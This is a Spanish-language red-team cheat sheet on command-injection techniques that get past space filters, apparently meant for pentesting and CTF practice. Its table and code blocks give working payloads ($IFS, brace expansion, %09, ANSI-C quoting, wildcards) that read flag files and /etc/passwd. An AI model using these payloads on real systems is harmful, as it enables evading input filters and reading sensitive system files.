---
aliases:
tags:
  - vuln/command-injection
  - technique/execution
  - asset/web-app
primary categories:
  - "[[Red Team]]"
secondary categories:
  - "[[Explotación]]"
  - "[[Web]]"
tertiary categories:
  - "[[Web Explotación]]"
kind: SubCheatSheet
linked:
  - "[[OS Command Injection]]"
---
# Command Injection - Bypass de Espacios

---

## Cheatsheet

| **Payload** | **Qué obtenés** | **Cuándo** |
|:---:|:---:|:---:|
| `cat<flag.txt` | Lee `flag.txt` usando `<` como input redirection | **Solo para leer archivos**. No sirve para argumentos arbitrarios. |
| `cat${IFS}flag.txt` | `$IFS` = espacio/tab/newline, expande a separador | Funciona en bash/sh. Llaves separan la var del texto. |
| `cat$IFS$9flag.txt` | `$9` = arg vacío → separa `$IFS` del siguiente texto | Cuando `{}` están bloqueados. |
| `{cat,flag.txt}` | Brace expansion expande con espacios automáticamente | **Solo Bash**. NO en sh/dash. |
| `cat%09flag.txt` | TAB (`%09`) como separador — la shell trata tab = espacio | WAF filtra `%20` pero deja `%09`. URL-encode. |
| `cat$'\x20'flag.txt` | `$'\x20'` = espacio literal via ANSI-C quoting | Bash 4+. Sortea filtros que buscan literal ` `. |
| ``cat`echo\ -e\ ' '`flag.txt`` | Sub-shell genera el espacio | Cuando ningún literal pasa. Ofuscación máxima. |
| `cat<<<$'flag.txt'` | here-string + ANSI-C → input directo sin espacio entre cmd y arg | Casos edge sin redirección. |
^ci-bypass-espacios

### Verificar contenido de `$IFS`

```bash
# Ver qué chars contiene IFS
echo -n "$IFS" | xxd
# Output típico:
# 00000000: 2009 0a                                  . ..
# → 0x20 (space) + 0x09 (tab) + 0x0a (newline)
# Cualquiera de los 3 actúa como separador.
```

### Combinable con bypass de filename

Si `flag` o `txt` también están filtrados, combinar con [[Command Injection - Lista Negra de Comandos]]:

```bash
cat${IFS}f'l'ag.t'x't        # comillas para romper firma
cat${IFS}fl?g.txt            # wildcard ? como char único
cat${IFS}/etc/p?ss?d         # wildcards en /etc/passwd
```

---
